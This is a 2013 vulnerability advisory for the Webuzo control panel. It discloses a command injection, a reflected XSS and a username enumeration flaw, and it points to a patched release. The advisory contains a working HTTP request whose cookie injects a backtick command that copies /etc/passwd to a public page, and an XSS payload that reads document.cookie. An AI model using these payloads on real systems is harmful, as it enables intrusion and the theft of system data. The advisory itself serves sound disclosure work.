## Webuzo Multiple Vulnerabilities (DS-2013-007)

Oct 31, 2013

* Affected Vendor: Softaculous Ltd
* Affected Software: Webuzo
* Affected Version: 2.1.3, earlier versions may also be affected
* Issue type: Command Injection, Cross-Site Scripting, Username Enumeration
* Release Date: 31 Oct 2013
* Discovered by: Mahendra
* CVE Identifier: CVE-2013-6041, CVE-2013-6042, CVE-2013-6043
* Issue status: Patch available

### Summary

Multiple security vulnerabilities have been identified in Webuzo 2.1.3 , which can be exploited to perform remote OS command injection, execute malicious script and enumerate users. Authentication is not required to exploit these issues.

### Remote OS Command Injection - CVE-2013-6041

The value of a cookie used by the application is not appropriately validated or sanitised before processing and permits backtick characters. This allows additional OS commands to be injected and executed on the server system, and may result in server compromise. The following HTTP request demonstrates this issue:

> `GET /index.php?act=login HTTP/1.1
>
> Host: xx.xx.xx.xx:2002
>
> User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0
>
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
>
> Accept-Language: en-US,en;q=0.5
>
> Accept-Encoding: gzip, deflate
>
> Cookie: SOFTCookies7972_sid=[this is your cookie value]`cat /etc/passwd > /home/yourUserName/public_html/pwned.html`
>
> Connection: keep-alive
>
> Cache-Control: max-age=0`

### Reflected Cross-Site Scripting - CVE-2013-6042

The File Manager module of Webuzo is affected by a minor cross-site scripting vulnerability. Although the 'user' parameter is not properly validated, resulting in the vulnerability, other security protections in place mitigate this issue to some extent. A security token which is randomly generated is present in the URL, however HTTPS is not enforced by default. The vendor claims that the token is assigned only to particular IP addresses which will logout the user if the token is used by another IP address. This issue can be considered as informational or very low risk issue depending on the environment setup and method used by the attacker to obtain the token.

+ HTTP Request Type: POST

  Affected parameter: user

  URL/page: /filemanager/login.php

  Example payload: 1" onmouseover=alert(document.cookie) pwned="

> `POST /sesseisbp4bciukbenlo/filemanager/login.php HTTP/1.1
>
> Host: xx.xx.xx.xx:2002

>
> user=1"+onmouseover=alert(document.cookie)+pwned="&passwd=asd&action=Login`

### Username enumeration - CVE-2013-6043

The application responds differently when a valid and invalid username is supplied to the login function, allowing the existence of usernames in the application to be determined. The following two responses were observed:

* Valid username and invalid password - “The username and password you entered is incorrect”
* Invalid username and password - “The Webuzo username you entered is invalid"

### Solution

* Upgrade to Webuzo 2.1.4
